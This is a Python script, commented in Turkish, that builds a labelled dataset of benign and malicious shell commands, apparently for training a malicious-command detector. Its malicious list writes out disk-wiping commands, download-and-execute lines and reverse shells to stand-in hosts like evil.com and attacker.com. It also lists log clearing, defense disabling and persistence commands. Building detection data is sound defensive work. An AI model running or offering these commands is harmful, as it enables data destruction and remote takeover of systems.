import pandas as pd
import random

def generate_dataset(size=10000):
    """Gelişmiş veri seti üretici - False Positive azaltılmış versiyon."""

    # Benign komutlar (genişletildi)
    benign_templates = [
        "ls -la", "pwd", "whoami", "date", "uptime", "ps aux", "df -h", "free -m",
        "cat /etc/passwd", "grep pattern file.txt", "find /home -name '*.txt'",
        "tar -czf backup.tar.gz /data", "cp file1.txt file2.txt", "mv old.txt new.txt",
        "chmod 755 script.sh", "chown user:group file.txt", "mkdir -p /tmp/test",
        "rmdir empty_folder", "touch newfile.txt", "echo 'Hello World'",
        "head -10 logfile.txt", "tail -f /var/log/syslog", "sort data.txt",
        "uniq sorted.txt", "wc -l document.txt", "cut -d',' -f1 data.csv",
        "sed 's/old/new/g' file.txt", "awk '{print $1}' data.txt",
        "ping -c 4 google.com", "traceroute google.com", "nslookup google.com",
        "curl -I https://google.com", "wget https://example.com/file.txt",
        "ssh user@server.com", "scp file.txt user@server:/path/", "rsync -av /src/ /dst/",
        "git clone https://github.com/user/repo.git", "git pull origin main",
        "docker ps", "docker images", "kubectl get pods", "systemctl status nginx",
        "crontab -l", "history", "which python", "type ls", "man ls",
        "python --version", "java -version", "node --version", "npm list",
        "pip list", "apt list --installed", "yum list installed",
        "service apache2 status", "systemctl reload nginx", "mount", "umount /dev/sdb1",
        "fdisk -l", "lsblk", "du -sh /var/log", "iostat", "vmstat", "top",
        "htop", "netstat -tulpn", "ss -tulpn", "iptables -L", "ufw status",
        "id user", "groups user", "last", "w", "who", "finger user",
        "passwd user", "useradd newuser", "usermod -aG sudo user", "userdel olduser"
    ]

    # LOLBAS "graylist" komutları benign olarak ekleniyor
    graylist_commands = [
        "regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll",
        "csc -target:library file.cs",
        "powershell Get-Process",
        "msbuild project.csproj",
        "certutil -hashfile file.txt SHA256"
    ]
    benign_templates.extend(graylist_commands)

    # Zararlı komutlar
    malicious_templates = [
        "rm -rf /", ":(){ :|:& };:", "dd if=/dev/zero of=/dev/sda",
        "mkfs.ext4 /dev/sda1", "wget http://malicious.com/malware.exe",
        "curl http://evil.com/payload.sh | bash", "echo 'virus' > /etc/passwd",
        "cat /dev/urandom > /dev/sda", "chmod 777 /etc/shadow",
        "nc -l -p 4444 -e /bin/bash", "python -c 'import os; os.system(\"rm -rf /\")'",
        "powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=", "cmd /c del /q /s C:\\*",
        "vssadmin delete shadows /all /quiet",
        "bcdedit /set {default} bootstatuspolicy ignoreallfailures",
        "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v malware /d C:\\malware.exe",
        "schtasks /create /tn 'evil' /tr 'C:\\malware.exe' /sc onlogon",
        "net user hacker password123 /add", "net localgroup administrators hacker /add",
        "attrib +h +s malware.exe",
        "copy malware.exe %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
        "wmic process call create 'cmd.exe /c powershell.exe'",
        "certutil -urlcache -split -f http://evil.com/malware.exe malware.exe",
        "bitsadmin /transfer myDownload http://evil.com/payload.exe C:\\payload.exe",
        "rundll32 javascript:'\\..\\mshtml,RunHTMLApplication ';alert('XSS')",
        "mshta javascript:alert('code execution')",
        "regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll",
        "powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(\"http://evil.com/payload.ps1\")'",
        "cmd /c echo malicious > C:\\Windows\\System32\\drivers\\etc\\hosts",
        "netsh advfirewall set allprofiles state off", "sc stop Windows Defender",
        "taskkill /f /im antimalware.exe", "wevtutil cl Security", "wevtutil cl System",
        "cipher /w:C:\\", "sdelete -p 10 -s -z C:\\", "format C: /q /x",
        "diskpart select disk 0 clean", "shutdown /r /f /t 0",
        "ncat -lvp 443 -e cmd.exe", "socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",
        "bash -i >& /dev/tcp/attacker.com/443 0>&1",
        "perl -e 'use Socket;$i=\"attacker.com\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
        "ruby -rsocket -e'f=TCPSocket.open(\"attacker.com\",443).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
    ]

    data = []

    # Benign veriler
    for _ in range(size // 2):
        cmd = random.choice(benign_templates)
        if random.random() < 0.3:
            variations = [
                f"{cmd} --help",
                f"sudo {cmd}",
                f"{cmd} -v",
                f"{cmd} | head -5",
                f"{cmd} > output.txt",
                f"{cmd} 2>/dev/null"
            ]
            cmd = random.choice(variations)
        data.append({"command": cmd, "label": "benign"})

    # Zararlı veriler
    for _ in range(size // 2):
        cmd = random.choice(malicious_templates)
        if random.random() < 0.3:
            variations = [
                f"{cmd} &",
                f"nohup {cmd}",
                f"{cmd} 2>&1",
                f"timeout 60 {cmd}",
                f"{cmd} >/dev/null",
                f"({cmd})"
            ]
            cmd = random.choice(variations)
        data.append({"command": cmd, "label": "malicious"})

    random.shuffle(data)
    df = pd.DataFrame(data)
    return df

if __name__ == '__main__':
    print("10000 girdi veri seti oluşturuluyor...")
    dataset = generate_dataset(10000)
    dataset.to_csv('dataset.csv', index=False)
    print(f"Veri seti başarıyla oluşturuldu: {len(dataset)} girdi")
    print(f"Benign: {len(dataset[dataset['label'] == 'benign'])}")
    print(f"Malicious: {len(dataset[dataset['label'] == 'malicious'])}")
